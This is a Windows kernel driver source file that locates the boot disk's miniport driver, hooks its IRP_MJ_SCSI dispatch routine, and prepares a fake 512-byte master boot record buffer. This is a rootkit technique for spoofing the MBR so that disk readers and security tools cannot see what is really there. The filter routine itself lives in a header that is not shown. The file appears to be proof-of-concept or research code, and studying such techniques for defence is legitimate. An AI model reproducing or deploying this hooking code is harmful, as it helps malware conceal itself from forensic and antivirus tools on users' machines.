#include <Ntifs.h>
#include "ScsiFilter.h"

VOID DriverUnload(IN PDRIVER_OBJECT DriverObject);

TypeMajorFunction OriginalScsi = NULL;
PDEVICE_OBJECT TargetDevice = NULL;
PDRIVER_OBJECT TargetDriver = NULL;
PVOID FakeMbr = NULL;
KSPIN_LOCK FakeMbrWriteLock;

CHAR FakeMbrContent[] = "Is this the real code? Is this just spoofed for me? bots trying to hide. Not sure of the legality.";

//Get FileObject of hard disk device
NTSTATUS GetHardDiskDevice(PFILE_OBJECT *FileObject)
{
	WCHAR BootDisk[] = L"\\Device\\Harddisk0\\DR0";
	UNICODE_STRING ObjectName;
	OBJECT_ATTRIBUTES ObjectAttributes;
	IO_STATUS_BLOCK StatusBlock;
	PFILE_OBJECT LocalFileObject;
	HANDLE DeviceHandle;
	NTSTATUS status;

	RtlInitUnicodeString(&ObjectName, BootDisk);

	InitializeObjectAttributes(&ObjectAttributes, &ObjectName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);

	status = ZwOpenFile(&DeviceHandle, GENERIC_READ, &ObjectAttributes, &StatusBlock, 
						FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);
	if(NT_SUCCESS(status))
	{
		status = ObReferenceObjectByHandle(DeviceHandle, GENERIC_READ, *IoFileObjectType, KernelMode, (PVOID *)&LocalFileObject, NULL);
		if(NT_SUCCESS(status))
		{
			*FileObject = LocalFileObject;
		}
		ZwClose(DeviceHandle);
	}	
	return status;
}

//Get lower device to hard disk device (Miniport)
NTSTATUS GetDiskMiniport(PDEVICE_OBJECT *DeviceObject)
{
	WCHAR BootDisk[] = L"\\Device\\Harddisk0\\DR0";
	PDEVICE_OBJECT LowerDevice;
	PFILE_OBJECT FileObject;
	NTSTATUS status; 

	status = GetHardDiskDevice(&FileObject);
	if(status == STATUS_SUCCESS)
	{
		DbgPrint("{DriverEntry} Getting lowest device in stack for: \\Device\\Harddisk0\\DR0\n");
		LowerDevice = IoGetLowerDeviceObject(FileObject->DeviceObject);
		if(LowerDevice)
		{
			*DeviceObject = LowerDevice;

			if(LowerDevice->DriverObject->DriverName.Buffer)
				DbgPrint("{DriverEntry} Found lowest device, parent driver (Disk Miniport): %ws\n", LowerDevice->DriverObject->DriverName.Buffer);
		}else{
			status = STATUS_NOT_FOUND;
		}

		ObDereferenceObject(FileObject);
	}
	return status;
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
	DriverObject->DriverUnload = &DriverUnload;

	KeInitializeSpinLock(&FakeMbrWriteLock);

	FakeMbr = ExAllocatePool(NonPagedPool, 512);
	if(!FakeMbr)
		return STATUS_FAILED_DRIVER_ENTRY;

	memset(FakeMbr, 0, 512);
	memcpy(FakeMbr, FakeMbrContent, strlen(FakeMbrContent));

	if(NT_SUCCESS(GetDiskMiniport(&TargetDevice)))
	{
		TargetDriver = TargetDevice->DriverObject;

		if(TargetDriver->MajorFunction[IRP_MJ_SCSI])
		{
			DbgPrint("{DriverEntry} Hooking IRP_MJ_SCSI in miniport driver.\n");
			OriginalScsi = TargetDriver->MajorFunction[IRP_MJ_SCSI];
			InterlockedExchange((PLONG)&TargetDriver->MajorFunction[IRP_MJ_SCSI], (LONG)ScsiFilter);
		}	

	}

	return STATUS_SUCCESS;
}

VOID DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
	if(OriginalScsi)
		InterlockedExchange((PLONG)&TargetDriver->MajorFunction[IRP_MJ_SCSI], (LONG)OriginalScsi);

	if(TargetDevice)
		ObDereferenceObject(TargetDevice);

	if(FakeMbr)
		ExFreePool(FakeMbr);

	DbgPrint("Driver Unloaded!\n");
}